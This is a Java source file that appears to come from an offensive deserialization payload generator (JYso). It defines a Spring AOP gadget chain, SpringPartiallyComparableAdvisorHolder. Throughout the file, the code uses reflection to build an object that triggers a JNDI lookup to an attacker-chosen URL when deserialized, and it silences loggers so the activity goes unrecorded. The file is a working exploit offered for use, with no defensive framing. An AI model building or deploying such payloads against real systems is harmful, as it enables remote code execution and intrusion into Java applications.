package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.utils.Reflections;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectInstanceFactory;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import java.lang.reflect.InvocationTargetException;

public class SpringPartiallyComparableAdvisorHolder implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        return makePartiallyComparableAdvisorHolder(command);
    }
    public Object makePartiallyComparableAdvisorHolder (String args ) throws Exception {
        String jndiUrl = args;
        UtilFactory uf = new UtilFactory();
        BeanFactory bf = makeJNDITrigger(jndiUrl);
        return makeBeanFactoryTriggerPCAH(uf, jndiUrl, bf);
    }
    public static BeanFactory makeJNDITrigger (String jndiUrl ) throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
        Reflections.setFieldValue(bf, "logger", new NoOpLog());
        Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
        return bf;
    }

    public static Object makeBeanFactoryTriggerPCAH ( UtilFactory uf, String name, BeanFactory bf ) throws ClassNotFoundException,
            NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
        AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
        Reflections.setFieldValue(aif, "beanFactory", bf);
        Reflections.setFieldValue(aif, "name", name);
        AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
        Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);

        // make readObject happy if it is called
        Reflections.setFieldValue(advice, "declaringClass", Object.class);
        Reflections.setFieldValue(advice, "methodName", "toString");
        Reflections.setFieldValue(advice, "parameterTypes", new Class[0]);

        AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
        Reflections.setFieldValue(advisor, "advice", advice);

        Class<?> pcahCl = Class
                .forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
        Object pcah = Reflections.createWithoutConstructor(pcahCl);
        Reflections.setFieldValue(pcah, "advisor", advisor);
        return uf.makeToStringTriggerUnstable(pcah);
    }


}
